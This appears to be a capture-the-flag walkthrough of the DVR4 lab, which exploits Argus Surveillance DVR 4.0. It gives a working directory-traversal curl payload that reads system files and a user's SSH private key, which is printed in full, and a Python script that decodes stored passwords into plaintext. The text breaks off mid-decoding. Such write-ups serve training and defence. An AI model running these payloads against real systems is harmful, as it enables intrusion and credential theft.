# DVR4

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Practice
Difficulty: Intermediate
Community Rating: Hard
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Windows
Points: 20
Number of Flags: 2
Lab Description:
A foothold on the target system will be established by exploiting a directory traversal vulnerability in the 
DVR software to access an SSH key. Privileges will then be elevated by decoding the Administrator password 
found in a configuration file. This lab focuses on exploiting vulnerabilities and privilege escalation methods.
```

Machine link: [https://portal.offsec.com/machine/dvr4-36048/overview/details](https://portal.offsec.com/machine/dvr4-36048/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all TCP-ports with `nmap` including service info and default scripts.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ export TARGET_IP=192.168.101.179

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-11 13:05 +0100
Nmap scan report for 192.168.101.179
Host is up (0.036s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http-proxy
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-title: Argus Surveillance DVR
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.99%I=7%D=11/11%Time=6AF45A38%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive\r\nK
SF:eep-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r\nCon
SF:tent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x20Surv
SF:eillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-Type\"
SF:\x20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name=\"GE
SF:NERATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.pysof
SF:t\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no\"\x2
SF:0border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"Top\"\x
SF:20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasT
SF:opFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r\n
SF:\x20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20scrolli
SF:ng=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwidth=\
SF:"0\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTable\"\
SF:x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Cameras
SF:BottomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20
SF:\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\x20fr
SF:ames,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p>\r\n
SF:\x20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\r\nCo
SF:nnection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nConte
SF:nt-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>
SF:\r\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x2
SF:0http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ISO-885
SF:9-1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x2
SF:06\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frame
SF:set\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20
SF:\x20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x
SF:20noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x20mar
SF:ginheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20
SF:frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"ActiveXIFr
SF:ame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<fra
SF:me\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\
SF:x20noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0\"\x2
SF:0marginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<
SF:p>This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doesn't\
SF:x20support\x20them\.</p>\r\n\x20\x20</noframes>\r");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-11-11T12:08:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.90 seconds
```

We have seven main TCP-services running and available:

- Bitvise WinSSHD 8.48 on port 22
- [Microsoft Windows RPC](https://en.wikipedia.org/wiki/Microsoft_RPC) on port 135
- [NetBIOS Session Service](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP#Session_service) on port 139
- [SMB](https://en.wikipedia.org/wiki/Server_Message_Block) running on port 445
- An unknown service on port 5040
- An unknown service on port 7680
- Actual Drawing 6.0 on port 8080

### SMB Discovery

Next, we check for general information and shares with NetExec.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ nxc smb $TARGET_IP -u '' -p '' --shares
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.179 445    DVR4             [*] Windows 10 / Server 2019 Build 19041 x64 (name:DVR4) (domain:DVR4) (signing:False) (SMBv1:None)
SMB         192.168.101.179 445    DVR4             [-] DVR4\: STATUS_ACCESS_DENIED 
SMB         192.168.101.179 445    DVR4             [-] Error enumerating shares: Error occurs while reading from remote(104)

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ nxc smb $TARGET_IP -u Guest -p '' --shares
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.179 445    DVR4             [*] Windows 10 / Server 2019 Build 19041 x64 (name:DVR4) (domain:DVR4) (signing:False) (SMBv1:None)
SMB         192.168.101.179 445    DVR4             [-] DVR4\Guest: STATUS_ACCOUNT_DISABLED 
```

No available shares but some OS information.

### Check the web sites

Manually browsing to `http://192.168.101.179:8080/` and shows a dashboard for Argus Surveillance DVR:

![DVR4 Homepage](Images/DVR4_Homepage.png)

Looking around on the web site we see that the software seems to be very old.

From `http://192.168.101.179:8080/About.html`:

```text
About the program:
 
Argus Surveillance DVR
 
Program is UNREGISTERED
License:
 
Version: 4.0
Released 18/12/2008
 
Argus Surveillance Inc.
```

We also find the following information on Users (`http://192.168.101.179:8080/Users.html`):

![DVR4 User Info](Images/DVR4_User_Info.png)

Apart from the `Administrator` user, there also seems to be a `Viewer` user.

### Search for exploits

Let's see if there any known exploit for this version.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ searchsploit Argus Surveillance DVR
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Argus Surveillance DVR 4.0 - Unquoted Service Path                                                                                                     | windows/local/50261.txt
Argus Surveillance DVR 4.0 - Weak Password Encryption                                                                                                  | windows/local/50130.py
Argus Surveillance DVR 4.0.0.0 - Directory Traversal                                                                                                   | windows_x86/webapps/45296.txt
Argus Surveillance DVR 4.0.0.0 - Privilege Escalation                                                                                                  | windows_x86/local/45312.c
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ searchsploit -m 45296              
  Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/45296
     Path: /usr/share/exploitdb/exploits/windows_x86/webapps/45296.txt
    Codes: CVE-2018-15745
 Verified: True
File Type: ASCII text
Copied to: /mnt/hgfs/OffSec_PG/PG_Practice/Intermediate/DVR4/45296.txt


┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ cat 45296.txt                                       
# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Author: John Page (aka hyp3rlinx)
# Date: 2018-08-28
# Vendor: www.argussurveillance.com
# Software Link: http://www.argussurveillance.com/download/DVR_stp.exe
# CVE: N/A

# Description:
# Argus Surveillance DVR 4.0.0.0 devices allow Unauthenticated Directory Traversal,
# leading to File Disclosure via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.

# PoC

curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

# Result:

; for 16-bit app support
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

wave=mmdrv.dll
timer=timer.drv

# https://vimeo.com/287115273
# Greetz: ***Greetz: indoushka | Eduardo | GGA***   
```

Looks good!

### Utilize directory traversal

We can verify the directory traversal with the PoC-example provided.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ curl "http://$TARGET_IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]
```

Verified!

### Get the user flag

But what file(s) should we look for? How about the user flag?

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ curl "http://$TARGET_IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2FDesktop%2Flocal.txt&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
c<REDACTED>5
```

Nice!

### Foothold as viewer

We should also check for private SSH-keys since SSH was installed.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ curl "http://$TARGET_IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

The private key is saved and we try to login.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ curl "http://$TARGET_IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa_viewer

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ ssh -i id_rsa_viewer viewer@$TARGET_IP 
The authenticity of host '192.168.101.179 (192.168.101.179)' can't be established.
ECDSA key fingerprint is SHA256:0zp+uR1SK5UOIuXmUFyBv6zUowYGwzY44kFpPaahWzs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.101.179' (ECDSA) to the list of known hosts.
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\Users\viewer>whoami
dvr4\viewer

C:\Users\viewer>
```

We are in!

### Enumeration for PrivEsc

Next, we enumerate the system for privilege escalation opportunities.

My [Windows Privilege Escalation Checklist](https://cajac.gitbook.io/ctf-notes/priv-esc/windows-privilege-escalation/windows-privesc-checklist) is used as inspiration.

Searching for passwords under `C:\Users` we find two interesting passwords/hashes.

```bat
C:\Users\viewer>cd ..

C:\Users>findstr /SI /C:"password" *.ini *.cfg *.config *.xml *.txt
All Users\Microsoft\IdentityCRL\INT\wlidsvcconfig.xml:    --><cfg:Settings><cfg:DeviceDNSSuffix>.devicedns.live.com</cfg:DeviceDNSSuffix><cfg:ResolveTimeout>0</cfg:ResolveTimeout><cfg:C
onnectTimeout>10000</cfg:ConnectTimeout><cfg:SendTimeout>30000</cfg:SendTimeout><cfg:ReceiveTimeout>30000</cfg:ReceiveTimeout><cfg:MinMinutesBetweenMetaConfigCheck>1440</cfg:MinMinutesB
<---snip--->
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2010Win64.xml:        <Name>PasswordTimeout</Name>                                                                                 
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2013Win32.xml:        <Name>PasswordTimeout</Name>                                                                                 
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2013Win64.xml:        <Name>PasswordTimeout</Name>                                                                                 
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2016Win32.xml:        <Name>PasswordTimeout</Name>                                                                                 
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2016Win64.xml:        <Name>PasswordTimeout</Name>                                                                                 
All Users\PY_Software\Argus Surveillance DVR\DVRParams.ini:DialUpPassword=                                                                                                               
All Users\PY_Software\Argus Surveillance DVR\DVRParams.ini:RecordEncryptionPassword=                                                                                                     
All Users\PY_Software\Argus Surveillance DVR\DVRParams.ini:TaskTrayPassword=                                                                                                             
All Users\PY_Software\Argus Surveillance DVR\DVRParams.ini:MotionEmailNeedPassword=0                                                                                                     
All Users\PY_Software\Argus Surveillance DVR\DVRParams.ini:MotionEmailPassword=                                                                                                          
All Users\PY_Software\Argus Surveillance DVR\DVRParams.ini:Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8                                                                        
All Users\PY_Software\Argus Surveillance DVR\DVRParams.ini:Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE                                                                
                                                                                                                                                                                         
C:\Users>    
```

It's strange though, that they have different length!? So maybe they aren't hashes but rather encoded/encrypted passwords of some kind.

### Decrypt the passwords

Remebering the output from `searchploit` there was something about "Weak Password Encryption".

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ searchsploit -m 50130             
  Exploit: Argus Surveillance DVR 4.0 - Weak Password Encryption
      URL: https://www.exploit-db.com/exploits/50130
     Path: /usr/share/exploitdb/exploits/windows/local/50130.py
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /mnt/hgfs/OffSec_PG/PG_Practice/Intermediate/DVR4/50130.py


┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ cat 50130.py           
# Exploit Title: Argus Surveillance DVR 4.0 - Weak Password Encryption
# Exploit Author: Salman Asad (@deathflash1411) a.k.a LeoBreaker
# Date: 12.07.2021
# Version: Argus Surveillance DVR 4.0
# Tested on: Windows 7 x86 (Build 7601) & Windows 10
# Reference: https://deathflash1411.github.io/blog/dvr4-hash-crack

# Note: Argus Surveillance DVR 4.0 configuration is present in
# C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini

# I'm too lazy to add special characters :P
characters = {
'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
'906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
'7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
'AAFE':'u','F787':'v','C165':'w','A935':'x','B734':'y','E4BC':'z','!':'B398'}

# ASCII art is important xD
banner = '''
#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
'''
print(banner)

# Change this :)
pass_hash = "418DB740F641E03B956BE1D03F7EF6419083956BECB453D1ECB4ECB4"
if (len(pass_hash)%4) != 0:
        print("[!] Error, check your password hash")
        exit()
split = []
n = 4
for index in range(0, len(pass_hash), n):
        split.append(pass_hash[index : index + n])

for key in split:
        if key in characters.keys():
                print("[+] " + key + ":" + characters[key])
        else:
                print("[-] " + key + ":Unknown") 
```

We update the Python script with the first hash and execute it.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ vi 50130.py     

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ grep pass_hash 50130.py 
pass_hash = "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8"
if (len(pass_hash)%4) != 0:
for index in range(0, len(pass_hash), n):
        split.append(pass_hash[index : index + n])

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ python 50130.py                                                     
/mnt/hgfs/OffSec_PG/PG_Practice/Intermediate/DVR4/50130.py:30: SyntaxWarning: "\_" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\_"? A raw string is also an option.
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown
```

The first password seems to be `14WatchD0g` plus one more character. Likely a special character of some kind.

On to the second password.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ vi 50130.py            

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ grep pass_hash 50130.py
pass_hash = "5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE"
if (len(pass_hash)%4) != 0:
for index in range(0, len(pass_hash), n):
        split.append(pass_hash[index : index + n])

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ python 50130.py        
/mnt/hgfs/OffSec_PG/PG_Practice/Intermediate/DVR4/50130.py:30: SyntaxWarning: "\_" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\_"? A raw string is also an option.
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] 5E53:I
[+] 4D7B:m
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] C875:i
[+] EB60:n
[+] 3CD9:g
[+] D8E1:Y
[+] BD8F:0
[+] AAFE:u
```

And the second password is `ImWatchingY0u`.

If we decode the `Description0`-field we know that the Administrator account uses the password with the special character.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ vi 50130.py                 

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ grep pass_hash 50130.py     
pass_hash = "60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083"
if (len(pass_hash)%4) != 0:
for index in range(0, len(pass_hash), n):
        split.append(pass_hash[index : index + n])

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ python 50130.py             
/mnt/hgfs/OffSec_PG/PG_Practice/Intermediate/DVR4/50130.py:30: SyntaxWarning: "\_" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\_"? A raw string is also an option.
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] 60CA:B
[+] AAFE:u
[+] C875:i
[+] 3F7E:l
[+] E03B:t
